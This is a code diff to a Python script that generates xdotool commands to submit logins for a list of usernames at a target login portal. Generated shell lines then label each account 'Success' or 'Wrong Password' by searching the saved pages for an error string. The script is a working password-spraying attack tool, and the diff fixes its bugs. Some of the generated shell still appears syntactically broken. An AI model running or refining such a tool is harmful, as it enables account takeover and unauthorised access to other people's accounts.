@@ -71,7 +71,8 @@ print("Creating xdotool sh command list...")
 commands = []
 
 for user in usernames:
-    # Navigate to the desired login portal
+    # Navigate to the desired login portal'
+    user = "".join(user.split())
     commands.append(f"xdotool mousemove {search} click 1 key ctrl+a")
     commands.append("xdotool key 'Delete'")
     commands.append(f"xdotool mousemove {search} click 1 type '{target_url}'")
@@ -100,7 +101,7 @@ for user in usernames:
     # Save page results
     commands.append(f"xdotool mousemove {blank} click 1 key ctrl+a")
     
-    name = user.split("@")[1]
+    name = user.split("@")[0]
     commands.append(f"xclip -o > \"{output_dir}/{name}.txt\"")
 
     # Add a delay
@@ -109,8 +110,8 @@ for user in usernames:
 # Process raw output into a readable, exportable results file
 process_output = []
 process_output.append(f"for file in `ls {output_dir}`; do")
-process_output.append(f"result=`cat {output_dir}/$file` | grep -i 'Wrong password. Try again' | wc -c")
-process_output.append("if [ $result -eq 0 ]; then; echo \"$file Success :D\"; else; echo \"$file Wrong Password :(\"")
+process_output.append(f"result=`cat {output_dir}/$file | grep -i 'Wrong password. Try again' | wc -c`")
+process_output.append("if [ $result -eq 0 ]; then; echo \"$file Success :D\"; else; echo \"$file Wrong Password :(\"; fi")
 
 
 print(f"Writing to '{target_filename}'...\n")
